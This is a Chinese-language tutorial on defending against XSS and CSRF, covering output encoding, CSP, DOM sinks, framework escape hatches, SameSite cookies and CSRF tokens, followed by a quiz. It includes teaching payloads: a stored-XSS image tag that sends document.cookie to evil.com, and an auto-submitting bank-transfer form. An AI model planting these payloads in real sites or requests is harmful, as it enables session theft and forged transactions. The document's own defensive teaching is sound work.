二十分钟学透 XSS 与 CSRF 攻防

XSS 和 CSRF 是浏览器安全模型的两朵"并蒂莲"：XSS 让攻击者的脚本跑在你的页面里（同源策略失效），CSRF 让浏览器替攻击者带上你的身份（Cookie 自动携带）。这篇讲清两类漏洞的机制、输出编码的上下文规则、CSP 的正确用法，以及 CSRF 各防御方案的边界。

开始前

两个漏洞的共同根源：浏览器替你做主

理解 XSS 和 CSRF，先理解浏览器的两条"贴心设计"—— 它们既是便利的根源，也是漏洞的根源。

浏览器机制带来了什么便利被滥用后变成
Cookie 随请求自动携带登录一次，整个会话期间所有请求自动带上身份CSRF：攻击者的站点诱导你的浏览器发请求，Cookie 照带不误
同源策略内脚本互信同源页面里的 JS 可以读写页面 DOM、发同源请求XSS：攻击者脚本注入你的页面，获得同源身份，为所欲为
关于 payload 的边界：本文的攻击 payload 只用于防御教学，目的是理解"浏览器的哪条机制被绕过了"。禁止在未授权系统上使用。验证防护请用自己本地的测试页面，或者 alert(document.domain) 这类无害探针。
一条贯穿全篇的主线：XSS 的所有防御（输出编码、CSP、HttpOnly）都在回答"我的页面里能跑什么代码"；CSRF 的所有防御（SameSite、Token、Origin 校验）都在回答"这个请求是不是用户本人意图"。两类问题、两套防线，但经常被混为一谈。
模块 1

XSS 三类形态与利用链

按"恶意脚本存在哪里、怎么到达浏览器"分成三类。区分它们很重要：存储型和反射型的防线在服务端，DOM 型的防线在前端。

类型恶意脚本的位置与路径典型场景
存储型脚本被存进数据库 / 文件 / 日志，所有访问受影响页面的用户都会中招评论、昵称、商品名、IM 消息、工单标题
反射型脚本在 URL / 表单参数里，服务端未转义就拼进响应，需要诱导用户点链接搜索结果页回显关键词、错误提示页、邮件中的跟踪链接
DOM 型服务端响应完全干净，前端 JS 把不可信数据（location.hash 等）写进 sink 时触发前端路由解析、location.hash 读取渲染、postMessage 处理

存储型 XSS 的完整利用链（教学）

// 第 1 步：注入。评论区提交带脚本的内容（被服务端原样入库）
评论内容：<img src=x onerror="fetch('//evil.com/log?c='+document.cookie)">

// 第 2 步：触发。其他用户打开帖子页，服务端把评论原样输出到 HTML，
// 浏览器解析到 img 标签 → onerror 触发 → 脚本以"你的站点同源身份"运行

// 第 3 步：扩大。同源身份意味着：
//   · 读取页面内容（冒充用户操作：改密码、转账、删数据）
//   · 发同源 AJAX 请求，携带用户 Cookie
//   · 偷 CSRF Token：从 DOM 里读取 token 再发伪造请求（XSS 击穿 CSRF 防线）
//   · 改写页面钓鱼（伪造登录框骗密码）

// 第 4 步：蠕虫。存储型脚本可以让"访问者自动转发/评论同样内容"，
// 实现自我传播（2005 年 MySpace 的 Samy 蠕虫是标志性事件）
HttpOnly 挡住了第一步，挡不住后面所有步。document.cookie 读不到 HttpOnly 的 Cookie，但攻击者根本不需要偷 Cookie —— 他已经在你的页面里，直接用这个身份发请求、读页面、点按钮。把 HttpOnly 当 XSS 的解药是经典误判。
危害排序（同条件下）：存储型 > DOM 型 ≈ 反射型。存储型影响全部用户且持续存在；反射型需要社工投递链接；DOM 型服务端日志甚至看不到异常请求（payload 在 # fragment 里，根本不发往服务器）—— 这也是它容易被监控漏掉的原因。
模块 2

输出编码：规则取决于上下文

XSS 防御的核心是输出编码：数据在离开程序进入 HTML 的那一刻，按目标上下文转义。关键认知：没有"一种通用转义"，只有"匹配上下文的转义"。HTML 上下文安全的数据，放进 JS 上下文可能照样被执行。

上下文危险字符正确编码方式
HTML 元素内容< > &实体编码：&lt; &gt; &amp;（< 变 &lt; 后浏览器只渲染文本）
HTML 属性值< > & " '属性值必须用引号包裹，引号做实体编码；属性名位置永远不要放不可信数据
JavaScript 上下文引号、反斜杠、换行、</script>\xHH / \uHHHH 十六进制转义；更优解是别把数据拼进行内 script —— 用 data 属性承载，前端读取时用 DOM API
URL 上下文javascript: 等协议注入encodeURIComponent 编码；并校验协议白名单（只允许 http/https），否则 "javascript:alert(1)" 会通过 href 执行
CSS 上下文expression()、url()、转义序列CSS 转义；避免把用户数据放进 style 属性；url() 里的数据同样要校验协议
# Python：html.escape 覆盖 HTML 上下文（默认 quote=True 连引号一起转）
html.escape(user_input)              # < → &lt;  > → &gt;  & → &amp;  " → &quot;
# Flask 的 Jinja2 自动转义 {{ }} 插值；|safe 是显式关闭，慎用

// Java：用 OWASP Java Encoder 而不是自己写 replace
Encode.forHtml(user_input)            // HTML 内容
Encode.forHtmlAttribute(user_input)   // 属性值
Encode.forJavaScript(user_input)      // JS 上下文
Encode.forUri(user_input)             // URL 参数
// 为什么不用 StringEscapeUtils / 自己 replace：转义规则随上下文变化，
// 手写 replace 必然漏（比如漏了 & 或单引号），用库按上下文调用

// Node / 前端：写文本用 textContent，不要用 innerHTML 拼字符串
el.textContent = userInput;    // 永远安全：文本节点，不解析 HTML
el.innerHTML = userInput;      // 危险：HTML 被解析，标签和事件属性全部生效
框架白名单：主流模板引擎默认转义 {{ }} 插值（Jinja2、Thymeleaf、EJS、Handlebars、React JSX、Vue 插值）。"默认转义"只覆盖它认识的插值语法——一旦你用字符串拼接绕过模板、或者用了引擎的"不转义"指令（|safe、v-html、dangerouslySetInnerHTML），保护立刻消失。模块 5 专门讲这些逃生舱。
最常见的单点失误：JS 内联上下文。后端模板里写 <script>var name = "{{ user.name }}";</script>，HTML 转义帮不了你 —— 攻击者输入 ";alert(1);//，引号闭合后就是任意 JS。正确做法：数据放 data 属性（<div data-name="...">），前端用 dataset 读取；或者 JSON 序列化后按 JS 上下文转义。
模块 3

CSP：第二层防线，用对才有效

Content-Security-Policy 通过响应头告诉浏览器："这个页面只允许从这些来源加载脚本/样式/图片……"。它是纵深防御的第二层：输出编码漏了一个洞，CSP 有机会把 exploit 拦在加载阶段。

# 一条能用的基线策略（Nginx / Apache / 应用层加响应头）
Content-Security-Policy: default-src 'self'; \
  script-src 'self' https://cdn.example.com; \
  style-src 'self' 'unsafe-inline'; \
  img-src 'self' data:; \
  connect-src 'self'; \
  object-src 'none'; \
  base-uri 'self'; \
  frame-ancestors 'none'

# 灰度期用 Report-Only：只报告不拦截，看报表再收紧
Content-Security-Policy-Report-Only: policy; report-uri /csp-report

script-src 的三个进阶武器

机制原理适用与注意
nonce每次响应生成一个随机数放头部，只有 <script nonce="同一个值"> 才被执行。攻击者猜不到 nonce，注入的脚本即使躲过编码也执行不了适合服务端动态页面；nonce 必须每次响应都换、且不可预测，缓存页面要小心 nonce 被缓存复用
hash对内联脚本内容做哈希，只有内容哈希匹配白名单的内联脚本才执行适合少量固定内联脚本；脚本内容一改哈希就得更新
strict-dynamic配合 nonce 使用：信任由"可信脚本"动态加载的后续脚本，不用把每个 CDN 都列出来现代 CSP 的核心，Chrome 52+ 支持；老浏览器忽略该关键字时仍需保留来源白名单兜底
CSP 的三个常见误用：
① script-src 带 'unsafe-inline'：等于允许所有内联脚本，XSS 防护基本归零 —— 很多站"有 CSP"但形同虚设，就是因为它。
② 把 CSP 当唯一防线：CSP 可以被古老的浏览器不支持、被配置疏漏绕过（漏掉某个指令），它降低攻击成功率，不消灭漏洞。输出编码仍是修复层。
③ 忘了 object-src 'none' 和 base-uri 'self'：<object> / <embed> 可执行插件内容，<base> 可劫持相对 URL —— 这两条是严格 CSP 的标配。
"严格 CSP"最小配方：object-src 'none'; base-uri 'self'; script-src 'nonce-{random}' 'strict-dynamic'。Google 的 CSP Evaluator 可以给你的策略打分，上线前跑一遍。
模块 4

DOM XSS：sink 与 source 清单

DOM 型 XSS 完全发生在前端：source（不可信数据入口）→ sink（执行/解析 HTML 的位置）。服务端日志甚至看不到异常请求，因为 payload 常在 URL 的 # fragment 里，根本不会发到服务器。

常见 source常见 sink
location.hash / location.search / location.href
document.referrer
window.name
postMessage 的 event.data
localStorage / URL 参数经前端路由解析		innerHTML / outerHTML / insertAdjacentHTML
document.write / document.writeln
eval / new Function / setTimeout("字符串") / setInterval("字符串")
location = / location.href = / location.assign()
element.setAttribute("href", ...) 等可执行属性
// 典型 DOM XSS：读取 URL fragment 直接写进 innerHTML
const q = location.hash.slice(1);
document.getElementById("result").innerHTML = "搜索：" + q;
// 构造 https://site.com/search#<img src=x onerror=alert(1)>
// fragment 不发往服务器，服务端一切正常，但浏览器执行了注入的脚本

// 修复：用 textContent，或白名单净化
document.getElementById("result").textContent = "搜索：" + q;
// 若确需渲染 HTML（富文本场景），用 DOMPurify 白名单净化后再赋值
el.innerHTML = DOMPurify.sanitize(q, {ALLOWED_TAGS: ["b","i","p"]});

// location 跳转同样要防：用户可控值直接赋值给 location.href
location.href = "/redirect?to=" + userInput;   // 内含 javascript: 协议即 XSS
// 修复：校验协议白名单
const url = new URL(userInput, location.origin);
if (["http:","https:"].includes(url.protocol)) location.href = url;
为什么 setTimeout("字符串") 也是 sink：字符串参数会被当作代码执行，等价于 eval。同样的坑还有 element.setAttribute("onclick", 用户数据)、模板引擎的编译型 API（Vue 的 Vue.compile、Handlebars 的 Handlebars.compile(用户模板)）—— 用户可控内容进了"编译/执行"通道，就是代码执行。判据：这个字符串最终会被谁当代码解析？
模块 5

框架自动转义与危险 API

React / Vue / Angular 默认转义插值，这是好事；但它们都留了"渲染原始 HTML"的逃生舱 —— 漏洞清单上长长一串 XSS，几乎都藏在逃生舱里。

框架安全默认（插值自动转义）危险逃生舱
React{value} JSX 插值自动转义dangerouslySetInnerHTML={{__html: value}}
javascript: 协议的 href
Vue{{ value }} 插值自动转义v-html="value"
Angular{{ value }} 插值自动转义bypassSecurityTrustHtml / TrustScript / TrustStyle / TrustResourceUrl 系列
Svelte{@html} 之外的插值自动转义{@html value}
// React：{{ }} 插值 vs dangerouslySetInnerHTML
<div>{userContent}</div>                        // 安全：内容按文本渲染
<div dangerouslySetInnerHTML={{__html: userContent}} />  // 危险：按 HTML 解析

// Vue：{{ }} vs v-html
<div>{{ userContent }}</div>                      // 安全
<div v-html="userContent"></div>                    // 危险：等价于 innerHTML

// 确需渲染富文本（评论带格式、文章预览）时的正确姿势
import DOMPurify from "dompurify";
const clean = DOMPurify.sanitize(userHtml);   // 白名单净化：只留安全标签/属性
<div v-html="clean"></div>
逃生舱审计原则：每出现一次 dangerouslySetInnerHTML / v-html / @html / bypassSecurityTrust*，必须能回答三个问题：数据来自哪、是否经过白名单净化、为什么不能用转义插值。答不上来就改成 textContent。仓库里全局搜这些关键字，每处都是一次代码评审。
模块 6

CSRF 原理与 SameSite

CSRF 的根因一句话：Cookie 会自动随请求携带，而服务端分不清这个请求是用户本人点的，还是被伪造的。攻击者甚至不需要读你的响应 —— 只要请求发出去、Cookie 带上、动作执行，他就赢了。

<!-- 攻击者页面里埋一个自动提交的表单（教学示意） -->
<form action="https://bank.com/transfer" method="POST" id="f">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.getElementById('f').submit()</script>
// 已登录 bank.com 的用户打开这个页面 → 表单自动 POST →
// 浏览器自动附带 bank.com 的 Cookie → 服务端视为"用户本人操作"
// 更轻量的形态：<img src="https://bank.com/logout"> 就能打一个 GET 型动作

// 为什么同源策略不拦这个？
// 简单请求（表单提交、img/script 加载）不需要 CORS 预检，浏览器允许跨站发出；
// 同源策略只拦"读取响应"，不拦"发出请求" —— 而 CSRF 不需要读响应

SameSite Cookie 属性：浏览器层面的第一道闸

取值行为适用
SameSite=Strict任何跨站请求都不带该 Cookie（包括从外部链接点进站点）安全性最高；代价：从聊天软件点链接首次进入时未登录态，需再登录一次
SameSite=Lax跨站不携带，但顶级导航的 GET 请求例外（点链接进入会带）现代浏览器默认值（Chrome 80+），安全与体验的平衡点
SameSite=None跨站也携带。必须同时加 Secure（否则浏览器拒绝）仅用于第三方嵌入式场景（跨站 iframe、SSO 回调），普通站点会话不要用
# 会话 Cookie 的正确配置（Set-Cookie 响应头）
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
# HttpOnly：JS 读不到，挡 XSS 偷 Cookie（注意：挡不住 XSS 的其他危害）
# Secure：只走 HTTPS，防中间人窃听
# SameSite=Lax：跨站 POST 天然不带 Cookie，CSRF 成本大幅上升
# Path=/ 与 Max-Age：控制作用域与过期，别用默认的会话级 + 全局域
SameSite 不是万能药：① 老浏览器不支持该属性（Safari 早期版本、IE 全系），攻击面仍在；② SameSite=Lax 对顶级 GET 导航放行，任何"GET 请求就能改变状态"的接口（如 /logout、/delete?id=）在 Lax 下仍可被跨站触发 —— 这就是为什么状态变更必须用 POST/PUT/DELETE；③ Chrome 强制第三方 Cookie 淘汰的政策仍在演进，跨站场景要跟进变化。
模块 7

CSRF 防御方案对比

SameSite 是浏览器替你把的第一道关，服务端仍需要自己的防线。四种方案的取舍，是这篇里最实用的部分。

方案原理优点 / 局限
Synchronizer Token服务端为每个会话生成随机 token，表单带隐藏字段，服务端比对。攻击者跨站读不到 token（同源策略拦响应读取）业界标准，可靠。需要服务端存储；要覆盖所有状态变更接口
双重提交 Cookie无状态场景（JWT 认证）：服务端把随机值写进 Cookie，前端 JS 读取后放到自定义 Header（如 X-CSRF-Token），服务端比对两者一致性不需要服务端存储。前提：子域名干净——任一子域被 XSS 都能写 Cookie 绕过；不如同步 token 强
自定义 Header 校验要求所有状态变更请求带 X-Requested-With 等自定义 Header。跨站简单请求加不了自定义 Header（不加就触发 CORS 预检，预检过不了）适合 AJAX 为主的架构，实现最轻。纯表单/多页应用不适用
Origin / Referer 校验服务端校验请求头里的来源是否为本站零存储、实现快。但不可单独依赖：Referer 可能被浏览器策略裁剪、HTTPS→HTTP 跳转丢失、企业代理剥离；老浏览器没有 Origin 头。适合做附加校验
# Synchronizer Token 的最小实现（Java 伪代码）
// 1. 登录后生成 token，存 session，并下发给页面
String token = SecureRandom-based UUID;
session.setAttribute("csrf", token);
model.addAttribute("csrfToken", token);   // 模板渲染进表单隐藏域

// 2. 页面表单带 token
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="${csrfToken}">
  ...
</form>

// 3. 服务端每个状态变更接口校验
if (!token.equals(session.getAttribute("csrf"))) throw new CsrfException();
// 框架白名单：Spring Security、Django、Laravel、Rails 都内置该模式，
// 默认开启 —— 关掉它之前先读完文档

# 错误做法：token 放 URL 查询参数（GET）
/transfer?_csrf=xxx&to=attacker   // token 会进浏览器历史、日志、Referer，且可被跨站 GET 触发
# 错误做法：只在前端 JS 里校验，服务端不验
// 攻击者直接构造 POST 请求，绕过前端校验
落地组合拳（推荐）：SameSite=Lax（浏览器层）+ Synchronizer Token（服务端层）+ 状态变更只用非 GET 方法（设计层）+ Origin 校验做附加告警（监控层）。四层成本都很低，任何单层失效都有兜底。框架内置的 CSRF 保护默认是开着的——Django 中间件、Spring Security、Laravel VerifyCsrfToken，出问题往往是有人"图省事"关掉了它。
模块 8

真实 payload 与修复对比汇总

XSS：三类形态的 payload 特征与修复

// 反射型：搜索页把关键词原样拼进响应
// 后端危险代码：response.write("<h1>搜索结果：" + kw + "</h1>")
攻击 URL：/search?q=<script>alert(document.domain)</script>
// 修复：输出编码 —— kw 里的 < > 变实体，浏览器只当文本

URL：/page#<img src=x onerror=alert(1)>
// 修复：textContent，或 DOMPurify.sanitize 后再 innerHTML

CSRF：攻击页与修复

// 修复二：状态变更接口校验 CSRF token（模块 7）

上线前七项自查

搜 innerHTML / v-html / dangerouslySetInnerHTML：逐个确认数据来源与净化，答不上来就改 textContent。
查输出编码：所有用户可控数据进入响应的位置，确认按上下文转义（HTML/属性/JS/URL/CSS 五套规则）。
部署 CSP：先用 Report-Only 灰度一周看报表，再上非空策略；确认 script-src 没有裸奔 unsafe-inline。
审计 Cookie 四件套：HttpOnly、Secure、SameSite、Path/域，逐个会话 Cookie 过一遍。
确认 CSRF 保护开着：框架内置中间件是否被关；token 是否覆盖全部状态变更接口；token 别放 GET 参数。
GET 纯洁性：全站检查有没有"GET 请求改变状态"的接口，有就改方法。
补监控：CSP 违规报表、异常 Referer/Origin 告警、前端错误监控（注入的脚本常先触发报错）。
避坑

十个真实坑

1
前端用 innerHTML 拼用户内容"图快"
el.innerHTML = "<b>" + name + "</b>" 这类拼接，name 里的标签和事件属性全部生效。写文本一律 textContent，需要结构就逐段 createElement。
2
滥用 React/Vue 的不转义 API
dangerouslySetInnerHTML、v-html、{@html}、bypassSecurityTrustHtml 用一次就多一个洞。确需富文本必须过 DOMPurify 白名单净化，且每次出现都要代码评审。
3
把 URL hash / search 直接读进 sink
location.hash 的数据不过服务端、不进日志，出了事连攻击现场都难还原。hash/search/referrer/postMessage 都是 source，进 innerHTML/eval/location 前必须处理。
4
只在入口过滤，不做输出编码
"输入时我已经过滤了 <script>"是黑名单思维，漏一种编码变形就全线崩溃。数据可能从任何入口进来（API、MQ、数据库、配置文件），唯一可靠的防线在输出端按上下文编码。
5
JS 内联上下文只做 HTML 转义
<script>var name="{{x}}"</script> 里 HTML 实体救不了你，攻击者用引号闭合即可注入 JS。数据走 data 属性 + dataset 读取，或按 JS 上下文转义。
6
CSP 写着 script-src 'unsafe-inline' 自我安慰
带 unsafe-inline 的 script-src 允许一切内联脚本，XSS 防护归零，只剩"我们有 CSP"的心理安慰。要么 nonce/hash，要么严格来源白名单；先 Report-Only 再收紧。
7
Cookie 三件套全裸奔
没 HttpOnly（XSS 可偷）、没 Secure（HTTP 明文可窃）、没 SameSite（跨站自动携带，CSRF 敞口）。会话 Cookie 上线前逐个过一遍这四五个属性。
8
CSRF token 只在前端校验，或放 GET 参数
前端校验可被直接构造请求绕过；token 放 URL 会进历史/日志/Referer，等于公开。token 必须服务端校验、POST body 或自定义 Header 携带。
9
用 GET 请求做状态变更
/delete?id=1、/logout 这类 GET 动作，在 SameSite=Lax 下跨站顶级导航仍会携带 Cookie，且能被 <img> 标签零成本触发。状态变更一律 POST/PUT/DELETE + CSRF token。
10
关掉框架内置 CSRF 保护"因为接口 403 了"
Django / Spring Security / Laravel 默认开启 CSRF 保护，报 403 的根因通常是前端没带 token（fetch 忘记带 header）。正确修法是补 token，不是关保护。
自测

六道题

1. 恶意评论被存进数据库，其他用户打开帖子即触发脚本执行。这属于？
正确答案：存储型 XSS。判据是"恶意数据持久化在服务端，影响所有访问该页面的用户"。修复要在输出端（服务端渲染时转义 / 前端渲染时 textContent 或 DOMPurify 净化），只修提交端不够 —— 库里可能已有存量脏数据。
2. 关于输出编码，哪个说法是对的？
正确答案：按上下文编码。HTML 上下文安全的数据放进 JS 上下文照样能执行（比如引号闭合内联 script）。入口过滤是黑名单思维，永远漏；输出编码才是覆盖所有数据来源的根本防线。
3. 关于 CSP 的 nonce 机制，正确的是？
正确答案：每次响应一个随机数，脚本标签 nonce 匹配才执行。固定 nonce 会被攻击者读到后复用；nonce 作用于 script-src，配合 strict-dynamic 是现代严格 CSP 的核心。
4. 已登录用户访问攻击者页面，页面里的表单自动 POST 到 bank.com/transfer 并成功执行。原因是？
正确答案：Cookie 自动携带 + 服务端无法验证意图。同源策略只拦"读取响应"，不拦"发出请求"，而 CSRF 不需要读响应。防御：SameSite=Lax（跨站 POST 不带 Cookie）+ CSRF token（攻击者拿不到）+ 状态变更禁用 GET。
5. SameSite=Lax 的 Cookie，下面哪个请求不会携带它？
正确答案：跨站 POST 不携带（这正是 Lax 挡 CSRF 的机制）。顶级导航的跨站 GET 是 Lax 的放行例外 —— 所以"GET 做状态变更"的接口在 Lax 下依然可被跨站触发，状态变更必须用非 GET 方法。Strict 则连跨站 GET 导航都不带。
6. 关于 HttpOnly Cookie，哪个说法准确？
正确答案：只挡 document.cookie 读取这一条路径。XSS 注入的脚本本来就在你的页面里，可以直接发同源请求、读 DOM、点按钮，根本不需要偷 Cookie。防 XSS 靠输出编码 + CSP；防 CSRF 靠 SameSite + token，各管各的。
